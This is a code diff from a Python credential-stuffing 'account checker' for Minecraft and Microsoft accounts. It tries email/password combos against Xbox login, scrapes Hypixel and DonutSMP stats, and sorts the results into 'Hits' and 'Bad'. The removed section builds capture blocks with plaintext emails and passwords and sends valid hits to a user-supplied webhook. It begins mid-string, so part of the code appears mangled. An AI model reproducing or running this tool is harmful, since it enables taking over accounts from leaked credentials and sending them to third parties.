@@ -78,7 +78,6 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
         pass
     return "None", session
 
-# --- HYPIXEL STATS SCRAPER ---
 def check_hypixel_stats(name):
     stats = {
         "level": "N/A",
@@ -110,7 +109,6 @@ def check_hypixel_stats(name):
         pass
     return stats
 
-# --- DONUTSMP SOCKET & WEB STATS CHECKER (Nexus V2 Logic) ---
 def check_donutsmp_status(mc_name, mc_uuid, mc_token):
     result = None
     disconnect_message = None
@@ -195,7 +193,6 @@ def check_donutsmp_status(mc_name, mc_uuid, mc_token):
                 if banid_match:
                     donut_data["ban_id"] = banid_match.group(1).strip()
 
-        # Fetch additional stats from DonutSMP web stats API
         try:
             stat_urls = [
                 f"https://stats.donutsmp.net/player/{mc_name}",
@@ -326,72 +323,4 @@ def run(input_path, output_path, user_webhook=None):
 
     with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
         out.writelines(final_output)
-craft Java"
-                donut_status = "No Game Ownership"
-        except Exception as e:
-            name = "Profile Error"
-            donut_status = "Error"
-
-        
-        cap_block = (
-            f"Email: {email}\n"
-            f"Password: {password}\n"
-            f"Name: {name}\n"
-            f"UUID: {player_uuid}\n"
-            f"Capes: {cape_list}\n"
-            f"DonutSMP Status: {donut_status}\n"
-            f"Hypixel Rank: {hypixel_stats['rank']}\n"
-            f"Hypixel Level: {hypixel_stats['level']}\n"
-            f"BedWars Stars: {hypixel_stats['bw_stars']}\n"
-            f"First Login: {hypixel_stats['first_login']}\n"
-            f"Last Login: {hypixel_stats['last_login']}\n"
-            f"Account Type: Minecraft Java\n"
-            f"============================\n"
-        )
-        capture_list.append(cap_block)
-
-        # Webhook Notification Trigger
-        try:
-            from app import send_hit_notification
-            send_hit_notification(
-                email=email,
-                password=password,
-                account_type="Minecraft Java",
-                capes=cape_list,
-                hypixel_status="Checked",
-                hypixel_level=hypixel_stats['level'],
-                hypixel_rank=hypixel_stats['rank'],
-                donut_status=donut_status,
-                user_webhook_url=user_webhook
-            )
-        except Exception as e:
-            print(f"[ERROR] Webhook error: {e}")
-
-    # Save Hits.txt
-    hits_file_path = os.path.join(res_dir, "Hits.txt")
-    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
-        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))
-
-    # Final Results Formatting
-    final_output = []
-    final_output.append("=== HITS [+] ===\n")
-    if hits_list:
-        final_output.extend([f"{h}\n" for h in hits_list])
-    else:
-        final_output.append("No hits found.\n")
     
-    final_output.append("\n=== BAD [-] ===\n")
-    if bad_list:
-        final_output.extend([f"{b}\n" for b in bad_list])
-    else:
-        final_output.append("No bad combos.\n")
-        
-    final_output.append("\n=== CAPTURES ===\n")
-    if capture_list:
-        final_output.extend(capture_list)
-    else:
-        final_output.append("No captures available.\n")
-
-    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
-        out.writelines(final_output)
-            
